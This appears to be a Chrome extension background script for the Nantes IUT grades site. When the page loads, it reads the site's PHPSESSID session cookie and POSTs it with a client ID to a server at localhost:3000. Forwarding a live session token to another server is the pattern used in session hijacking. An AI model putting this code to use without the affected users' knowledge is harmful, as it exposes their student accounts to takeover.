chrome.webNavigation.onCompleted.addListener(function(details) {
    var targetUrl = "https://notes.iut-nantes.univ-nantes.fr/"
    if(details.url == targetUrl){
        chrome.cookies.get({"url":"https://notes.iut-nantes.univ-nantes.fr/","name":"PHPSESSID"}, async function(cookie) {
            sendSESSIONID(await getLocalID(),cookie.value)
        })
    }
})  

const IP = "http://localhost:3000"

async function sendSESSIONID(ClientID,SESSIONID){
    var response = await fetch(IP+"/sendSessionID", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "ClientID": ClientID,
            "SESSIONID": SESSIONID})
    });
    response = await response.json()
    if (response != true){
        alert("Une erreur est survenue")
    }
}

async function getLocalID(){
    var LocalId = new Promise((resolve,reject)=>{
        chrome.storage.local.get('id',(result)=>{
            resolve(result.id)
        })
    })
    return await LocalId
}
